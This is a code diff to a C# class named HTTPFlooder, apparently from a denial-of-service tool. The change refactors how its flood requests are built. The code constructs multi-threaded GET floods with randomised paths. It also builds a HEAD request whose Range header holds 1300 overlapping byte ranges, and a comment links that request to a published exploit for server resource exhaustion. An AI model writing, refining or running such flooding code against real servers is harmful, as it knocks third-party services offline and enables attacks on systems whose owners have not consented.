@@ -7,7 +7,6 @@ namespace GAS.Core
 {
     public class HTTPFlooder : IAttacker
     {
-        private volatile byte[] buf;
         bool init = false;
         public IPAddress IP, DNS;
         public string Subsite;
@@ -15,7 +14,7 @@ namespace GAS.Core
         private bool random, usegZip, IPOrDns = true, Resp;
         private Thread[] WorkingThreads;
         private volatile int _attacktype = 0;
-        private string AttackHeader = "";
+        private volatile string AttackHeader = "";
         public HTTPFlooder(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip,int threadcount,int attacktype=0)
         {
             ThreadCount = threadcount;
@@ -45,31 +44,10 @@ namespace GAS.Core
                 Stop();
             IsDelayed = false;
             IsFlooding = true;
-            StringBuilder tmp = new StringBuilder(6000);
-            for (int k = 0; k < 1300; tmp.Append(",5-" + (k++))) ;
-            this.AttackHeader = tmp.ToString();
-            #region Headers
-            if (this._attacktype == 0)
-                buf = System.Text.Encoding.ASCII.GetBytes(
-                 String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
-                                       "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
-                                       Subsite,
-                                       Functions.RandomString(),
-                                       DNS,
-                                       ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
-                                       "")));
-            else
-            {
-                buf = System.Text.Encoding.ASCII.GetBytes(
-                    String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
-                            Subsite,
-                            (random ? Functions.RandomString() : null),
-                            DNS,
-                            (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
-                            Environment.NewLine,
-                            AttackHeader));
-            }
-            #endregion
+            StringBuilder temp = new StringBuilder(6000);
+            for (int k = 0; k < 1300; temp.Append(",5-" + (k++))) ;
+            this.AttackHeader = temp.ToString();
+            
             for (int i = 0; i < ThreadCount; i++)
                 (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
             init = true;
@@ -82,6 +60,31 @@ namespace GAS.Core
             try
             {
                 #region Prepare
+                byte[] buf;
+                #region Headers
+                if (this._attacktype == 0)
+                    buf = System.Text.Encoding.ASCII.GetBytes(
+                     String.Format(random ? "GET {0}{1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n" :
+                                           "GET {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\n",
+                                           Subsite,
+                                           Functions.RandomString(),
+                                           DNS,
+                                           ((usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) :
+                                           "")));
+                else
+                {
+
+                    //http://1337day.com/exploits/16729
+                    buf = System.Text.Encoding.ASCII.GetBytes(
+                        String.Format("HEAD {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}Host: {2}{4}{4}Range:bytes=0-{5}{4}Connection: close{4}{4}",
+                                Subsite,
+                                (random ? Functions.RandomString() : null),
+                                DNS,
+                                (usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null),
+                                Environment.NewLine,
+                                AttackHeader));
+                }
+                #endregion
                 int bfsize = 1024; // this should be less than the MTU
                 byte[] recvBuf = new byte[bfsize];
                 int recvd = 0;
